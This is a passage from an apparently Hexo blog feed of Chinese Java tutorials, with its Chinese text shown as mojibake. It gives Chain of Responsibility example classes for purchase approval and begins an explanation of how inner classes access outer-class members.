System.out.println(<span class="hljs-string">&quot; è¯·æ±‚ç¼–å· id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; è¢« &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; å¤„ç†&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DepartmentApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ä¸»ä»»</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DepartmentApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DepartmentApprover</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (purchaseRequest.getPrice() &lt;= <span class="hljs-number">5000</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot; è¯·æ±‚ç¼–å· id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; è¢« &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; å¤„ç†&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            approver.processRequest(purchaseRequest);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PurchaseRequest.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><br><span class="hljs-comment">//è¯·æ±‚ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PurchaseRequest</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//è¯·æ±‚ç±»å‹</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-variable">price</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.0f</span>; <span class="hljs-comment">//è¯·æ±‚é‡‘é¢</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">PurchaseRequest</span><span class="hljs-params">(<span class="hljs-type">int</span> type, <span class="hljs-type">float</span> price, <span class="hljs-type">int</span> id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.type = type;<br>      <span class="hljs-built_in">this</span>.price = price;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> type;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> price;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>   <br>   <br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>SchoolMasterApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ ¡é•¿</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolMasterApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">SchoolMasterApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">30000</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot; è¯·æ±‚ç¼–å· id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; è¢« &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; å¤„ç†&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ViceSchoolMasterApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‰¯æ ¡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViceSchoolMasterApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ViceSchoolMasterApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">10000</span> &amp;&amp; purchaseRequest.getPrice() &lt;= <span class="hljs-number">30000</span>) &#123;<br>         System.out.println(<span class="hljs-string">&quot; è¯·æ±‚ç¼–å· id= &quot;</span> + purchaseRequest.getId() + <span class="hljs-string">&quot; è¢« &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; å¤„ç†&quot;</span>);<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>         approver.processRequest(purchaseRequest);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">è¯·æ±‚ç¼–å· id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> è¢« ä½Ÿæ ¡é•¿ å¤„ç†<br>è¯·æ±‚ç¼–å· id<span class="hljs-operator">=</span> <span class="hljs-number">1</span> è¢« ä½Ÿæ ¡é•¿ å¤„ç†<br>è¯·æ±‚ç¼–å· id<span class="hljs-operator">=</span> <span class="hljs-number">2</span> è¢« æé™¢é•¿ å¤„ç†<br>è¯·æ±‚ç¼–å· id<span class="hljs-operator">=</span> <span class="hljs-number">2</span> è¢« æé™¢é•¿ å¤„ç†<br></code></pre></td></tr></table></figure><h2 id="èŒè´£é“¾æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#èŒè´£é“¾æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> èŒè´£é“¾æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>å°†è¯·æ±‚å’Œå¤„ç†åˆ†å¼€ï¼Œå®ç°è§£è€¦ï¼Œæé«˜ç³»ç»Ÿçš„çµæ´»æ€§</p></li><li><p>ç®€åŒ–äº†å¯¹è±¡ï¼Œä½¿å¯¹è±¡ä¸éœ€è¦çŸ¥é“é“¾çš„ç»“æ„</p></li><li><p>æ€§èƒ½ä¼šå—åˆ°å½±å“ï¼Œç‰¹åˆ«æ˜¯åœ¨<strong>é“¾æ¯”è¾ƒé•¿çš„æ—¶å€™</strong>ï¼Œå› æ­¤éœ€æ§åˆ¶é“¾ä¸­æœ€å¤§èŠ‚ç‚¹æ•°é‡ï¼Œä¸€èˆ¬é€šè¿‡åœ¨ Handler ä¸­è®¾ç½®ä¸€ä¸ªæœ€å¤§èŠ‚ç‚¹æ•°é‡ï¼Œåœ¨ setNext()æ–¹æ³•ä¸­åˆ¤æ–­æ˜¯å¦å·²ç»è¶…è¿‡é˜€å€¼ï¼Œè¶…è¿‡åˆ™ä¸å…è®¸è¯¥é“¾å»ºç«‹ï¼Œé¿å…å‡ºç°è¶…é•¿é“¾æ— æ„è¯†åœ°ç ´åç³»ç»Ÿæ€§èƒ½</p></li><li><p>å‚è€ƒç¬”è®°ï¼š</p><ul><li><a href="https://www.runoob.com/design-pattern/design-pattern-tutorial.html">èœé¸Ÿæ•™ç¨‹è®¾è®¡æ¨¡å¼</a></li><li><a href="https://www.bilibili.com/video/BV1G4411c7N4?p=148&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">å°šç¡…è°·Javaè®¾è®¡æ¨¡å¼ï¼ˆå›¾è§£+æ¡†æ¶æºç å‰–æï¼‰ç¬”è®°èµ„æ–™</a></li></ul></li><li><p>å­¦ä¹ è§†é¢‘</p><ul><li><a href="https://www.bilibili.com/video/BV1G4411c7N4?p=148&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">å°šç¡…è°·Javaè®¾è®¡æ¨¡å¼ï¼ˆå›¾è§£+æ¡†æ¶æºç å‰–æ</a></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>è®¾è®¡æ¨¡å¼</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¾è®¡æ¨¡å¼</tag>
      
      <tag>è¿›é˜¶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Javaå†…éƒ¨ç±»ä¸­ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡</title>
    <link href="/2023/01/04/%E5%9C%A8Java%E5%86%85%E9%83%A8%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F/"/>
    <url>/2023/01/04/%E5%9C%A8Java%E5%86%85%E9%83%A8%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="åœ¨javaå†…éƒ¨ç±»ä¸­ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡"><a class="markdownIt-Anchor" href="#åœ¨javaå†…éƒ¨ç±»ä¸­ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡"></a> åœ¨Javaå†…éƒ¨ç±»ä¸­ä½¿ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡</h1><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨å®šä¹‰æˆå‘˜æ–¹æ³•æˆ–è€…æˆå‘˜å˜é‡çš„æ—¶å€™ï¼Œå¯ä»¥ç»™å…¶åŠ ä¸Šä¸€äº›æƒé™çš„ä¿®é¥°è¯ï¼Œä»¥é˜²æ­¢å…¶ä»–ç±»çš„è®¿é—®ã€‚å¦‚åœ¨æˆå‘˜å˜é‡æˆ–è€…æˆå‘˜æ–¹æ³•å‰é¢ï¼ŒåŠ ä¸Š<code>Private</code>å…³é”®å­—ï¼Œåˆ™å…¶ä»–ç±»å°±æ— æ³•è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„æˆå‘˜æ–¹æ³•æˆ–åˆ™å’Œæˆå‘˜å˜é‡ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿™ä¸ªç±»æœ‰æˆå‘˜å†…éƒ¨ç±»ï¼Œåˆ™ä¸å—è¿™æ–¹é¢çš„é™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æˆå‘˜å†…éƒ¨ç±»ä¸­å¯ä»¥éšæ„å¼•ç”¨å¤–éƒ¨ç±»çš„æˆå‘˜æ–¹æ³•ä»¥åŠæˆå‘˜å˜é‡ï¼Œå³ä½¿è¿™äº›ç±»æˆå‘˜æ–¹æ³•æˆ–è€…æˆå‘˜å˜é‡è¢«ä¿®é¥°äº†<code>private</code>.å¦‚åœ¨æˆå‘˜å¤–éƒ¨ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªiå˜é‡ï¼Œå¹¶ä¸”åˆ©ç”¨<code>private</code>å…³é”®å­—æ¥ä¿®é¥°ã€‚æ­¤æ—¶åœ¨å…¶ä»–ç±»ä¸­æ˜¯ä¸èƒ½å¤Ÿå¼•ç”¨è¿™ä¸ªç§æœ‰æˆå‘˜å˜é‡çš„ã€‚ä½†æ˜¯è¿™ä¸ªç±»çš„æˆå‘˜å†…éƒ¨ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™ä¸ä»…å¯ä»¥å¼•ç”¨è¿™ä¸ªå¤–éƒ¨ç±»çš„ç§æœ‰å˜é‡ï¼Œè€Œä¸”è¿˜å¯ä»¥å¯¹å…¶è¿›è¡Œèµ‹å€¼ç­‰æ“ä½œã€‚è¿™ä¸ªèµ‹å€¼æ“ä½œå¯¹äºå¤–éƒ¨ç±»ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚å³æˆå‘˜å†…éƒ¨ç±»å¯ä»¥æ›´æ”¹å¤–éƒ¨ç±»ä¸­ç§æœ‰å˜é‡çš„å€¼ã€‚ï¼ˆæ·±å…¥ç†è§£åµŒå¥—ç±»å’Œå†…éƒ¨ç±»ï¼‰</p><p><strong>è¦åœ¨å¤–éƒ¨ç±»ä¸­å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚</strong></p><p>å¦‚æœä¸€ä¸ªç±»å®šä¹‰åœ¨å¦å¤–ä¸€ä¸ªç±»ä¸­ï¼Œæˆä¸ºæˆå‘˜å†…éƒ¨ç±»ï¼Œæ­¤æ—¶ä¸€å®šè¦æ³¨æ„ï¼Œå†…éƒ¨ç±»çš„å®ä¾‹ä¸€å®šè¦ç»‘å®šåœ¨Javaå¤–éƒ¨ç±»çš„å®ä¾‹ä¸Šã€‚ï¼ˆå¦‚ä½•åœ¨å†…éƒ¨ç±»ä¸­è¿”å›å¤–éƒ¨ç±»å¯¹è±¡ï¼‰ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦ä»å¤–éƒ¨ç±»ä¸­åˆå§‹åŒ–ä¸€ä¸ªå†…éƒ¨ç±»çš„å¯¹è±¡ï¼Œæ­¤æ—¶å†…éƒ¨ç±»çš„å¯¹è±¡å°±ä¼šç»‘å®šåœ¨å¤–éƒ¨ç±»çš„å¯¹è±¡ä¸Šã€‚è¿™è·Ÿæ™®é€šçš„ç±»æœ‰æ‰€ä¸åŒã€‚æ™®é€šçš„ç±»ï¼Œåˆ›å»ºå®Œä¹‹åï¼Œä¸ä¸€å®šé©¬ä¸Šéœ€è¦å®ä¾‹åŒ–ã€‚åœ¨éœ€è¦ç”¨åˆ°è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå†è¿›è¡Œå®ä¾‹åŒ–å³å¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªç±»æˆä¸ºå¦å¤–ä¸€ä¸ªç±»çš„æˆå‘˜å†…éƒ¨ç±»ï¼Œåˆ™å°±ä¸åŒäº†ã€‚å¿…é¡»è¦åœ¨å¤–éƒ¨ç±»ä¸­å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥å®ç°å°†å†…éƒ¨ç±»çš„å®ä¾‹ç»‘å®šåœ¨å¤–éƒ¨ç±»çš„å®ä¾‹ä¸Šã€‚ç®€å•çš„è¯´ï¼Œå°±æ˜¯åœ¨å®šä¹‰å¤–éƒ¨ç±»çš„æ—¶å€™ï¼Œå¦‚æœæœ‰æˆå‘˜å†…éƒ¨ç±»ï¼Œé‚£ä¹ˆå°±ä¸è¦å¿˜äº†åœ¨å¤–éƒ¨ç±»ä¸­åˆ©ç”¨<code>new</code>å…³é”®å­—æ¥å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚è€Œå¯¹äºå¤–éƒ¨ç±»æ¥è¯´ï¼Œåˆ™å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™å†è¿›è¡Œå®ä¾‹åŒ–ã€‚å¦‚æ­¤å°±å¯ä»¥ä¿è¯ï¼Œåˆ©ç”¨å¤–éƒ¨ç±»åˆ›å»ºå¯¹è±¡çš„åŒæ—¶åˆ›å»ºäº†å†…éƒ¨ç±»çš„å¯¹è±¡ã€‚ä»è€Œå¯ä»¥ä¿è¯Javaå†…éƒ¨ç±»çš„å®ä¾‹ç»‘å®šåœ¨å¤–éƒ¨ç±»çš„å®ä¾‹ä¸Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * **è¦åœ¨å¤–éƒ¨ç±»ä¸­å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨ã€‚**</span><br><span class="hljs-comment"> * [demo02]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/4 10:23]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">1818</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoyxtwoy&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> getA();<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xtwoy&quot;</span>;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;A&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                    <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åœ¨å¤–éƒ¨ç±»ä¸­åˆ©ç”¨newå…³é”®å­—æ¥å®ä¾‹åŒ–å†…éƒ¨ç±»å¯¹è±¡çš„å¼•ç”¨</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> demo02.Demo01.A</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> å¸­å­</span><br><span class="hljs-comment">     */</span><br>    A <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">priA</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(a);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Demo01&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, a=&quot;</span> + a +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Demo01</span> <span class="hljs-variable">demo01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo01</span>();<br>        demo01.priA();<br>        System.out.println(demo01);<br>        System.out.println(demo01.a);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>æˆå‘˜å†…éƒ¨ç±»ä¸­æˆå‘˜æ–¹æ³•ä¸æˆå‘˜å˜é‡çš„ç§æœ‰æ€§ã€‚</strong></p><p>ä½œä¸ºæˆå‘˜å†…éƒ¨ç±»ï¼Œå¯ä»¥éšæ„å¼•ç”¨å¤–éƒ¨ç±»ä¸­çš„æˆå‘˜å˜é‡ä¸æˆå‘˜æ–¹æ³•ã€‚é‚£ä¹ˆåœ¨æˆå‘˜å†…éƒ¨ç±»ä¸­å®šä¹‰çš„æˆå‘˜å˜é‡ï¼Œå¤–éƒ¨ç±»æ˜¯å¦ä¹Ÿå¯ä»¥éšæ„è®¿é—®å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚å†…éƒ¨ç±»å¯ä»¥è®¿é—®å®ƒå¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œä½†æ˜¯å†…éƒ¨ç±»çš„æˆå‘˜ï¼ˆå¦‚æˆå‘˜å˜é‡æˆ–è€…æˆå‘˜æ–¹æ³•ï¼‰åªæœ‰åœ¨å†…éƒ¨ç±»çš„èŒƒå›´ä¹‹å†…æ˜¯å¯çŸ¥çš„ï¼Œä¸èƒ½å¤Ÿè¢«å¤–éƒ¨ç±»ç›´æ¥å¼•ç”¨ã€‚å¦‚ç°åœ¨åœ¨å¤–éƒ¨ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå˜é‡<code>i</code>ï¼Œåœ¨å†…éƒ¨ç±»ä¸­å®šä¹‰äº†å¦ä¸€ä¸ªå˜é‡<code>ii</code>.æ­¤æ—¶åœ¨æˆå‘˜å†…éƒ¨ç±»ä¸­ï¼Œå¯ä»¥ç›´æ¥å¼•ç”¨è¿™ä¸ªå¤–éƒ¨ç±»ä¸­çš„å˜é‡iï¼Œä¹Ÿå¯ä»¥å¯¹å…¶ç›´æ¥è¿›è¡Œèµ‹å€¼ï¼Œå¦‚i=5ç­‰ç­‰ã€‚ä½†æ˜¯åœ¨å¤–éƒ¨ç±»ä¸­ï¼Œåˆ™ä¸èƒ½å¤Ÿç›´æ¥å¼•ç”¨å†…éƒ¨ç±»ä¸­çš„æˆå‘˜å˜é‡ã€‚å¦‚åœ¨å¤–éƒ¨ç±»ä¸­ï¼Œåˆ©ç”¨ii=5çš„èµ‹å€¼è¯­å¥æ”¹å˜è¿™ä¸ªå˜é‡çš„å€¼ï¼Œå°±å±äºè¯­æ³•é”™è¯¯ï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™å°±ä¼šå‡ºç°é”™è¯¯ã€‚å¦‚æœå¤–éƒ¨ç±»çœŸçš„è¦å¼•ç”¨å†…éƒ¨ç±»çš„æˆå‘˜ï¼Œé‚£ä¹Ÿä¸æ˜¯ä¸å¯ä»¥ã€‚åªæ˜¯ä¸èƒ½å¤Ÿè¿›è¡Œç›´æ¥çš„å¼•ç”¨ï¼Œè€Œæ˜¯è¦ä½¿ç”¨å†…éƒ¨ç±»å¯¹è±¡å¼•